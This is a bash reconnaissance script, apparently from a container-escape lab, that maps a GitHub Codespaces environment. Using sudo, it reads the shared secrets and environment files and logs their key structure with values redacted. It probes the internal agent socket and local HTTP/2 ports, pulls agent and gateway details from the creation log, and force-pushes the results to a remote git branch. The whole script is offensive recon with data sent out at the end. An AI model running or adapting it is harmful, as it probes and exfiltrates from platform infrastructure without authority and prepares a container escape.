#!/usr/bin/env bash
# task.sh: robust recon3 (always produces output file, always pushes)
set +e
OUT=/workspaces/container-escape-lab/codespace-recon3.txt
SH=/workspaces/.codespaces/shared
echo "RECON3 START $(date -u +%FT%TZ)" > "$OUT"

redact_stream() {
  python3 -c "
import sys
for l in sys.stdin.read().splitlines():
    if '=' in l and len(l) > 24 and not l.startswith('#'):
        k, _, v = l.partition('=')
        print(k + '=REDACTED-len' + str(len(v)))
    else:
        print(l[:160])
"
}
json_keys() {
  python3 -c "
import sys, json
raw = open(sys.argv[1], errors='replace').read() if len(sys.argv) > 1 else ''
try:
    d = json.loads(raw)
    def walk(o, pre=''):
        if isinstance(o, dict):
            for k, v in o.items():
                if isinstance(v, (dict, list)):
                    walk(v, pre + k + '.')
                else:
                    s = str(v)
                    lk = k.lower()
                    if any(x in lk for x in ('token', 'secret', 'key', 'password', 'sig')):
                        print(pre + k + ' = <REDACTED len=' + str(len(s)) + '>')
                    else:
                        print(pre + k + ' = ' + s[:100])
        elif isinstance(o, list):
            for i, v in enumerate(o[:8]):
                walk(v, pre + '[' + str(i) + '].')
    walk(d)
except Exception as e:
    print('parse err:', e)
" "$1"
}

echo "== [A] shared/.env structure" >> "$OUT"
sudo cat $SH/.env 2>/dev/null | redact_stream >> "$OUT" 2>&1

echo "== [A2] shared/.env-secrets structure" >> "$OUT"
sudo cat $SH/.env-secrets 2>/dev/null | redact_stream >> "$OUT" 2>&1

echo "== [A3] .user-secrets.json key tree" >> "$OUT"
json_keys $SH/.user-secrets.json >> "$OUT" 2>&1

echo "== [A4] user-secrets-envs.json" >> "$OUT"
json_keys $SH/user-secrets-envs.json >> "$OUT" 2>&1

echo "== [A5] environment-variables.json" >> "$OUT"
json_keys $SH/environment-variables.json >> "$OUT" 2>&1

echo "== [A6] read-config.json" >> "$OUT"
json_keys $SH/read-config.json >> "$OUT" 2>&1

echo "== [A7] merged/repo devcontainer" >> "$OUT"
json_keys $SH/merged_devcontainer.json >> "$OUT" 2>&1
json_keys /workspaces/.codespaces/.persistedshare/repo_devcontainer.json >> "$OUT" 2>&1

echo "== [B] cs-agent.sock protocol probe" >> "$OUT"
SOCK=$SH/cs-agent.sock
for path in / /health /status /v1/ /api/ /info; do
  C=$(curl -sS -m 4 --unix-socket $SOCK -o /tmp/a.out -w "%{http_code}" "http://localhost$path" 2>/dev/null)
  echo "GET $path: ${C:-ERR} :: $(head -c 100 /tmp/a.out 2>/dev/null | tr '\n' ' ')" >> "$OUT"
done
curl -sS -m 4 --unix-socket $SOCK -o /tmp/a2.out -w "GET / upgrade: %{http_code}" \
  -H 'Connection: Upgrade' -H 'Upgrade: websocket' -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' -H 'Sec-WebSocket-Version: 13' \
  http://localhost/ 2>/dev/null >> "$OUT" 2>&1
echo "" >> "$OUT"
echo "sock head: $(head -c 150 /tmp/a2.out 2>/dev/null | tr '\n' ' ')" >> "$OUT"
ls -la $SOCK >> "$OUT" 2>&1

echo "== [C] creation.log architecture intel (redacted, filtered)" >> "$OUT"
sudo cat /workspaces/.codespaces/.persistedshare/creation.log 2>/dev/null | redact_stream | grep -iE 'agent|gateway|endpoint|url|host|token|socket|port|vm|docker' | head -30 >> "$OUT" 2>&1

echo "== [D] agent bin inventory" >> "$OUT"
echo "count: $(ls /.codespaces/bin | wc -l)" >> "$OUT"
ls /.codespaces/bin | grep -vE '\.dll$' | head -20 >> "$OUT" 2>&1
find /.codespaces/bin -maxdepth 1 \( -name '*.json' -o -name '*.config' -o -name '*runtimeconfig*' \) 2>/dev/null | head -10 >> "$OUT" 2>&1

echo "== [E] HTTP2 endpoints" >> "$OUT"
for p in 16634 16636 44169; do
  for scheme in http https; do
    C=$(curl -sS -m 4 --http2-prior-knowledge -k -o /tmp/h.out -w "%{http_code}" "$scheme://127.0.0.1:$p/" 2>/dev/null)
    echo "port $p ($scheme h2): ${C:-ERR} :: $(head -c 80 /tmp/h.out 2>/dev/null | tr '\n' ' ')" >> "$OUT"
  done
done

echo "== [F] unifiedContainerInformation" >> "$OUT"
json_keys /workspaces/.codespaces/.persistedshare/unifiedContainerInformation.json >> "$OUT" 2>&1

echo "RECON3 DONE $(date -u +%FT%TZ)" >> "$OUT"

cd /workspaces/container-escape-lab || exit 0
git config user.email "recon@codespace.local"; git config user.name "recon"
git checkout -b codespace-recon3 2>/dev/null || git checkout codespace-recon3
git add -f codespace-recon3.txt
git commit -m "recon3 output" || true
git push origin codespace-recon3 -f 2>&1 | tail -2
exit 0
